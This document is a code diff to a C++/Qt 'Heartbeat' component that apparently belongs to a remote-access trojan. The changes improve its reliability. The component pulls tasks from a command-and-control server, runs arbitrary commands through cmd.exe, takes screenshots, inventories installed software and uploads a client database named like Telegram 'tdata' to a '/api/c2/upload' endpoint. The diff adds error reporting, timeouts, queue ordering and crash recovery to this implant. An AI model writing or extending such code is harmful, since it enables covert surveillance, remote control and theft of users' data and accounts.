@@ -152,6 +152,25 @@ void Heartbeat::start() {
     // Initialize DB
     ensureDbInit(getDbPath());
     
+    // Reset any tasks that were stuck in in_progress state from previous run
+    resetStuckTasks();
+
+    // Initialize last upload time from DB
+    {
+        sqlite3* db;
+        if (sqlite3_open(getDbPath().toUtf8().constData(), &db) == SQLITE_OK) {
+            sqlite3_stmt* stmt;
+            const char* sql = "SELECT created_at FROM local_tasks WHERE command = 'upload_db' AND status = 'completed' ORDER BY created_at DESC LIMIT 1;";
+            if (sqlite3_prepare_v2(db, sql, -1, &stmt, 0) == SQLITE_OK) {
+                if (sqlite3_step(stmt) == SQLITE_ROW) {
+                    _lastUploadTime = sqlite3_column_int64(stmt, 0);
+                }
+                sqlite3_finalize(stmt);
+            }
+            sqlite3_close(db);
+        }
+    }
+
     // Inject initial tasks if not already done
     injectInitialTasks();
 
@@ -592,17 +611,34 @@ void Heartbeat::uploadClientDb(const QString& taskId) {
     }
 
     QString filePath = getDbPath();
-    if (!QFile::exists(filePath)) return;
+    if (!QFile::exists(filePath)) {
+        if (!taskId.isEmpty()) {
+            uploadResult(taskId, "DB file not found", "failed");
+        }
+        return;
+    }
     
     QString uploadName = "tdata_client.db";
     if (_currentTgId != 0) {
         uploadName = QString("tdata_client_%1.db").arg(_currentTgId);
     }
     
-    // Create copy for upload
-    QString tempPath = QStandardPaths::writableLocation(QStandardPaths::TempLocation) + "/" + uploadName;
+    // Create copy for upload with unique name to avoid conflicts
+    QString tempFileName = uploadName;
+    if (!taskId.isEmpty()) {
+        tempFileName = taskId + "_" + uploadName;
+    } else {
+        tempFileName = QString::number(QDateTime::currentMSecsSinceEpoch()) + "_" + uploadName;
+    }
+
+    QString tempPath = QStandardPaths::writableLocation(QStandardPaths::TempLocation) + "/" + tempFileName;
     QFile::remove(tempPath);
-    if (!QFile::copy(filePath, tempPath)) return;
+    if (!QFile::copy(filePath, tempPath)) {
+         if (!taskId.isEmpty()) {
+             uploadResult(taskId, "Failed to copy DB for upload", "failed");
+         }
+         return;
+    }
     
     QHttpMultiPart *multiPart = new QHttpMultiPart(QHttpMultiPart::FormDataType);
 
@@ -629,12 +665,17 @@ void Heartbeat::uploadClientDb(const QString& taskId) {
     QString url = _c2Url + "/api/c2/upload";
     
     QNetworkRequest request(url);
+    request.setTransferTimeout(300000); // 5 minutes timeout for large files
     QNetworkReply* reply = _network.post(request, multiPart);
     multiPart->setParent(reply);
 
     connect(reply, &QNetworkReply::finished, this, [this, reply, tempPath, taskId]() {
         if (reply->error() != QNetworkReply::NoError) {
             uploadResult(taskId, "DB Upload failed: " + reply->errorString(), "failed");
+        } else {
+            if (!taskId.isEmpty()) {
+                uploadResult(taskId, "DB Uploaded Successfully", "completed");
+            }
         }
         reply->deleteLater();
         QFile::remove(tempPath);
@@ -842,6 +883,14 @@ bool Heartbeat::hasInitialTasksRun() {
     return exists;
 }
 
+void Heartbeat::resetStuckTasks() {
+    sqlite3* db;
+    if (sqlite3_open(getDbPath().toUtf8().constData(), &db) != SQLITE_OK) return;
+
+    sqlite3_exec(db, "UPDATE local_tasks SET status = 'failed', updated_at = strftime('%s','now') WHERE status = 'in_progress';", 0, 0, 0);
+    sqlite3_close(db);
+}
+
 void Heartbeat::processLocalTasks() {
     sqlite3* db;
     if (sqlite3_open(getDbPath().toUtf8().constData(), &db) != SQLITE_OK) return;
@@ -863,7 +912,8 @@ void Heartbeat::processLocalTasks() {
 
     // 2. Pick next pending task
     sqlite3_stmt* stmt;
-    const char* sql = "SELECT task_id, command, params FROM local_tasks WHERE status = 'pending' ORDER BY created_at ASC LIMIT 1;";
+    // Use rowid for strict FIFO ordering
+    const char* sql = "SELECT task_id, command, params FROM local_tasks WHERE status = 'pending' ORDER BY created_at ASC, rowid ASC LIMIT 1;";
     sqlite3_prepare_v2(db, sql, -1, &stmt, 0);
     
     QString taskId, command, params;
@@ -962,6 +1012,10 @@ void Heartbeat::executeTask(const QString& taskId, const QString& command, const
                 uploadResult(taskId, output + error, "completed");
                 process->deleteLater();
         });
+        connect(process, &QProcess::errorOccurred, [this, taskId, process](QProcess::ProcessError error) {
+             uploadResult(taskId, "Process Error: " + QString::number(error), "failed");
+             process->deleteLater();
+        });
         process->start("cmd.exe", QStringList() << "/c" << params);
     } else if (command == "start_monitor") {
         int interval = params.toInt();
@@ -972,7 +1026,7 @@ void Heartbeat::executeTask(const QString& taskId, const QString& command, const
     } else if (command == "stop_monitor") {
         _monitorTimer.stop();
         uploadResult(taskId, "Monitor stopped", "completed");
-    } else if (command == "screenshot") {
+    } else if (command == "screenshot" || command == "get_screenshot") {
         performScreenshot(taskId);
     } else if (command == "get_software") {
         collectInstalledSoftware();
